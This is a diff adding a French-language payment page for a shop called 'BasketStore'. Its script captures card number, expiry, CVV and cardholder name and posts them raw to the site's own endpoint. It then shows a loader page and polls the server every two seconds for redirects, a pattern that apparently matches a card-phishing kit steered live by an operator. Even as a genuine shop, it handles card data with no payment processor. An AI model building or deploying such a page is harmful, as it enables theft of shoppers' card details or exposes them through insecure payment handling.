@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Paiement - BasketStore</title>
+</head>
+<body>
+<h1>💳 Paiement</h1>
+<form id="paymentForm">
+<input type="text" placeholder="Numéro de carte" name="cardNumber" required>
+<input type="text" placeholder="Expiry MM/YY" name="expiry" required>
+<input type="text" placeholder="CVV" name="cvv" required>
+<input type="text" placeholder="Nom titulaire" name="nomTitulaire" required>
+<button type="submit">Payer maintenant</button>
+</form>
+
+<script>
+document.getElementById('paymentForm').addEventListener('submit', async e=>{
+  e.preventDefault();
+  const form = e.target;
+  const data = {
+    cardNumber: form.cardNumber.value,
+    expiry: form.expiry.value,
+    cvv: form.cvv.value,
+    nomTitulaire: form.nomTitulaire.value
+  };
+  await fetch('/api/payment', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(data)
+  });
+  window.location.href='/loader.html';
+});
+
+async function checkStatus() {
+  try {
+    const res = await fetch('/api/status');
+    const data = await res.json();
+    if(data.redirect && window.location.pathname !== data.redirect){
+      window.location.href = data.redirect;
+    }
+    setTimeout(checkStatus, 2000);
+  } catch(e){ setTimeout(checkStatus, 2000); }
+}
+checkStatus();
+</script>
+</body>
+</html>
